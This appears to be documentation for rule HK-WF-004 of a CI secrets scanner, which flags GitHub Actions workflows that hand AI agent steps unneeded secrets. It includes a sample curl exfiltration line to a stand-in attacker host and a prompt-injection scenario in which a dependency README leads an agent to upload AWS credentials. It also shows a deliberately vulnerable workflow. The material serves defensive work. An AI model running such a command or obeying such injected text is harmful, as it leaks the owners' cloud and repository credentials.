# HK-WF-004: AI agent step receives secrets it does not need

| Check | Runs in | Default severity |
|---|---|---|
| `workflows` | `heldkeys ci` | High for the whole secrets context, cloud or source-control credentials, and personal access tokens. Medium for any other extra secret, for `secrets: inherit` into a local agent workflow, and for the cloud keys Claude Code needs when it runs on Bedrock or Vertex. |

## What it detects

Secrets that reach an agent step beyond the credentials the agent itself needs. heldkeys follows every `${{ secrets.X }}` and `${{ toJSON(secrets) }}` into the step through:

- the step's `with:` inputs and `env:`;
- the job's and the workflow's `env:`, which every step inherits;
- the script of a `run:` step that invokes an agent CLI;
- `secrets:` (including `secrets: inherit`) on a job that calls an agent reusable workflow from another repository;
- `secrets: inherit` on a job that calls a local reusable workflow (`./.github/workflows/...`) with an agent in it. Only the secrets the called workflow names reach the agent today, but every repository secret is one edit (or one hijacked step) away, so this is reported at Medium. With explicit `secrets:`, the called workflow only gets what is passed, and secrets it names but is not given are not counted;
- every step of `copilot-setup-steps.yml`, because those steps prepare the environment the Copilot coding agent then works in.

What the agent needs is its documented credential inputs (for example `anthropic_api_key` or `claude_code_oauth_token` for claude-code-action, `openai-api-key` for codex-action, `gemini_api_key` for run-gemini-cli) and model-provider keys in general (`ANTHROPIC_*`, `OPENAI_*`, `GEMINI_*` and similar). Anything else is reported.

When claude-code-action selects Amazon Bedrock or Google Vertex AI (`use_bedrock: true`, `use_vertex: true`, or `CLAUDE_CODE_USE_BEDROCK` / `CLAUDE_CODE_USE_VERTEX` for the CLI), that cloud's credentials are how the agent reaches its model, so they are expected: heldkeys reports them at Medium with a note to prefer OIDC (a role limited to the model, assumed with `id-token: write`) over stored keys, instead of High as unneeded cloud keys. Another cloud's keys are still High.

A secret fed into a `github_token`, `GH_TOKEN` or `token` input is always reported: the action works with `github.token` or its own GitHub App, and a stored secret there is a personal access token or app key that outlives the job and usually reaches more than one repository.

## Why it matters for agents

A hijacked agent can read anything in its environment and anything passed to its process. Secrets are masked in logs, but masking does nothing against `curl -d "$AWS_SECRET_ACCESS_KEY" https://attacker.example` or a base64 round trip.

A team adds `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` to the job `env:` so the agent can "check the staging bucket". Weeks later, a dependency's README that the agent reads during an upgrade tells it to verify AWS access by uploading `~/.aws` and the environment to a "diagnostics endpoint". The keys are long-lived and belong to a deploy user; the attacker now has staging, and probably more.

## Vulnerable

```yaml
on: workflow_dispatch

permissions:
  contents: read

jobs:
  claude:
    runs-on: ubuntu-latest
    env:
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
    steps:
      - uses: anthropics/claude-code-action@<sha> # v1
        with:
          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
          github_token: ${{ secrets.GH_PAT }}
          claude_env: |
            ALL_SECRETS: ${{ toJSON(secrets) }}
```

## Fixed

Give the agent its model key and nothing else. Steps that need other credentials run in their own job, and cloud access goes through OIDC with a role scoped to that job, not through stored keys.

```yaml
on: workflow_dispatch

permissions:
  contents: read

jobs:
  claude:
    runs-on: ubuntu-latest
    steps:
      - uses: anthropics/claude-code-action@<sha> # v1
        with:
          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}

  deploy:
    needs: claude
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: aws-actions/configure-aws-credentials@<sha> # v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy-staging
          aws-region: eu-west-1
```

## Example

One finding as `heldkeys ci --format json` reports it:

```json
{
  "check": "workflows",
  "rule": "HK-WF-004",
  "title": "Agent step gets secrets it does not need",
  "location": ".github/workflows/claude.yml:12 jobs.claude.steps[0] (uses: anthropics/claude-code-action@0123456)",
  "fingerprint": null,
  "severity": "high",
  "lifetime": "long-lived",
  "access": "unknown",
  "detail": "Claude Code receives AWS_SECRET_ACCESS_KEY via jobs.claude.env.AWS_SECRET_ACCESS_KEY (cloud or SCM credential); GH_PAT via with.github_token (a personal access token or app key; the agent can use github.token or its GitHub App); the whole secrets context (with.claude_env)",
  "fix": "Pass the agent only its model key; run steps that need other secrets in a separate job, and use OIDC instead of cloud keys.",
  "category": "workflow"
}
```

Through a local reusable workflow called with `secrets: inherit`:

```json
{
  "check": "workflows",
  "rule": "HK-WF-004",
  "title": "Agent step gets secrets it does not need",
  "location": ".github/workflows/gemini-dispatch.yml:15 jobs.review -> .github/workflows/gemini-review.yml:19 jobs.review.steps[1] (uses: google-github-actions/run-gemini-cli@v0)",
  "fingerprint": null,
  "severity": "medium",
  "lifetime": "long-lived",
  "access": "unknown",
  "detail": "Gemini CLI receives every repository secret through secrets: inherit at .github/workflows/gemini-dispatch.yml:15 jobs.review",
  "fix": "Pass the called workflow only its model key (secrets: { NAME: ${{ secrets.NAME }} }) instead of secrets: inherit, and use OIDC instead of cloud keys.",
  "category": "workflow"
}
```

## References

- [GitHub: using secrets in GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)
- [GitHub: security hardening with OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
- [GitHub: customizing the Copilot coding agent's environment](https://docs.github.com/en/copilot/how-tos/use-copilot-agents/coding-agent/customize-the-agent-environment)
- [zizmor: secrets-inherit and overprovisioned-secrets audits](https://docs.zizmor.sh/audits/)
